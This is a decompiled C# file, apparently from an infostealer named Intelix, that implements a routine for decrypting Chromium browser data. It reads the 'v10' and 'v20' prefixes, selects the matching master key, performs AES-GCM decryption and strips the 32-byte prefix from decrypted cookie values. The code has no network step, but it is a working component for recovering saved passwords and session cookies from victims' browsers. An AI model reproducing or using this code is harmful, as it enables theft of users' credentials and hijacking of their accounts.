using System;
using System.Text;

namespace Intelix.Helper.Encrypted
{
	// Token: 0x0200006B RID: 107
	public static class AesGcm
	{
		// Token: 0x06000196 RID: 406 RVA: 0x0001405C File Offset: 0x0001225C
		public static byte[] DecryptBrowser(byte[] encryptedData, byte[] masterKey10, byte[] masterKey20, bool checkprefix)
		{
			bool flag = encryptedData.Length < 31;
			byte[] result;
			if (flag)
			{
				result = null;
			}
			else
			{
				string @string = Encoding.ASCII.GetString(encryptedData, 0, 3);
				byte[] array = new byte[12];
				Buffer.BlockCopy(encryptedData, 3, array, 0, 12);
				int num = 15;
				int num2 = encryptedData.Length - num - 16;
				bool flag2 = num2 < 0;
				if (flag2)
				{
					result = null;
				}
				else
				{
					byte[] array2 = new byte[num2];
					bool flag3 = num2 > 0;
					if (flag3)
					{
						Buffer.BlockCopy(encryptedData, num, array2, 0, num2);
					}
					byte[] array3 = new byte[16];
					Buffer.BlockCopy(encryptedData, encryptedData.Length - 16, array3, 0, 16);
					byte[] array4 = (@string == "v20") ? masterKey20 : ((@string == "v10") ? masterKey10 : null);
					bool flag4 = array4 == null;
					if (flag4)
					{
						result = null;
					}
					else
					{
						byte[] array5 = AesGcm256.Decrypt(array4, array, null, array2, array3);
						bool flag5 = array5 == null;
						if (flag5)
						{
							result = null;
						}
						else
						{
							bool flag6 = checkprefix && AesGcm.HasPrefix(array5);
							if (flag6)
							{
								bool flag7 = array5.Length <= 32;
								if (flag7)
								{
									return array5;
								}
								int num3 = 0;
								for (int i = 0; i < 32; i++)
								{
									byte b = array5[i];
									bool flag8 = b >= 32 && b <= 126;
									if (flag8)
									{
										num3++;
									}
									bool flag9 = num3 > 2;
									if (flag9)
									{
										break;
									}
								}
								bool flag10 = num3 > 2;
								if (flag10)
								{
									bool flag11 = array5.Length <= 32;
									if (flag11)
									{
										return new byte[0];
									}
									byte[] array6 = new byte[array5.Length - 32];
									Array.Copy(array5, 32, array6, 0, array6.Length);
									return array6;
								}
							}
							result = array5;
						}
					}
				}
			}
			return result;
		}

		// Token: 0x06000197 RID: 407 RVA: 0x00014230 File Offset: 0x00012430
		private static bool HasPrefix(byte[] plainText)
		{
			bool flag = plainText.Length < 32;
			bool result;
			if (flag)
			{
				result = false;
			}
			else
			{
				int num = 0;
				for (int i = 0; i < 32; i++)
				{
					bool flag2 = plainText[i] >= 32 && plainText[i] <= 126;
					if (flag2)
					{
						num++;
					}
				}
				result = (num > 2);
			}
			return result;
		}

		// Token: 0x0400004B RID: 75
		private const int MacBitSize = 128;

		// Token: 0x0400004C RID: 76
		private const int NonceBitSize = 96;

		// Token: 0x0400004D RID: 77
		private const int TagBytes = 16;

		// Token: 0x0400004E RID: 78
		private const int NonceBytes = 12;

		// Token: 0x0400004F RID: 79
		private const int HeaderBytes = 3;
	}
}
